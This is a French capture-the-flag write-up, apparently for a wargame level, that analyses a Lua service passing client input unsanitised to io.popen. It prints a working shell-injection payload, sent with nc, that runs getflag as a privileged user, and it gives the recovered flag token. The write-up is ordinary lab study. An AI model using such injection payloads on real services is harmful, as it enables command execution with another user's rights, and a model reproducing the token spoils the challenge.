# level11

1. Fichiers trouvés dans `~/` :

```bash
level11.lua
```

---

2. Analyse rapide du script `level11.lua`

* Le service écoute `127.0.0.1:5151` et lit une ligne fournie par le client.
* Il exécute ensuite :

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

* Problème : la variable `pass` est **concaténée** directement dans une commande shell → **injection shell possible** (substitutions `$(...)`, backticks, `;`, redirections, etc.).

---

3. Vulnérabilité & objectif

* Le processus s'exécute avec les droits de `flag11` → l'objectif est d'exécuter `/bin/getflag` côté serveur et d'écrire la sortie dans un fichier lisible par l'utilisateur.

---

4. Exploitation

```bash
# envoyer le payload au service (depuis la même machine, car le service bind 127.0.0.1)
echo '$(/bin/getflag > /tmp/flag11; chmod 644 /tmp/flag11)' | nc 127.0.0.1 5151

# récupérer le token créé
cat /tmp/flag11
```

5. Token decouvert

Le token est `fa6v5ateaw21peobuub8ipe6s`